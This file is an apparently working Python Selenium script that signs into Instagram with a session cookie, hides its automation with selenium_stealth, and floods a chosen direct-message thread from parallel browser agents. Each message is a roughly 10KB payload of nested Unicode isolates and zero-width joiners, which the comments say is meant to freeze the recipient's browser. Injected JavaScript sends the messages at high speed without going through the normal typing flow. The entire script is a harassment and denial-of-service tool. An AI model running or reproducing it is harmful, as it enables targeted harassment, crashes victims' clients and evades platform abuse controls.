# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (RECURSIVE-VOID V51)
# 📅 STATUS: ATOMIC-UI-FREEZE | 4-AGENT TOTAL | AWS-CPU-MAX

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.15)  # 🔥 High-Frequency Strike
REST_AFTER_STRIKES = 150   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_heavy_void_payload():
    """Generates a recursive layout block that forces a Main-Thread lock."""
    u_id = random.randint(1000, 9999)
    # \u2068 = Isolate Start | \u2069 = Isolate Pop
    # \u200D = ZWJ | \u2060 = Word Joiner
    iso, pop, zwj, glue = "\u2068", "\u2069", "\u200D", "\u2060"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [VOID_LOCK:{u_id}]"
    
    body = []
    # 410 lines - Hitting the absolute 10kb Instagram limit
    for i in range(410):
        # Nested isolates (3 deep) combined with ZWJ bonding
        # This tells the browser: "This is a single character that is 3 levels deep."
        # It forces the CPU into a recursive loop.
        line = f"{iso}{iso}{iso}PRAVEER{zwj}PAPA{zwj}🌙{i}{pop*3}{glue*5}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # 🛡️ Keep YOUR bot's CPU light by disabling all rendering
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_send(driver, text):
    """Bypasses 'Typing' status by firing hardware-level dispatch events."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // 1. Clear previous attempts
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                // 2. Inject heavy payload
                document.execCommand('insertText', false, arguments[0]);
                // 3. Trigger framework state update
                box.dispatchEvent(new Event('input', { bubbles: true }));
                // 4. Force Enter dispatch
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_heavy_void_payload()
                if atomic_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Recursive-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 70 == 0:
                        driver.refresh()
                        time.sleep(10)
                
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
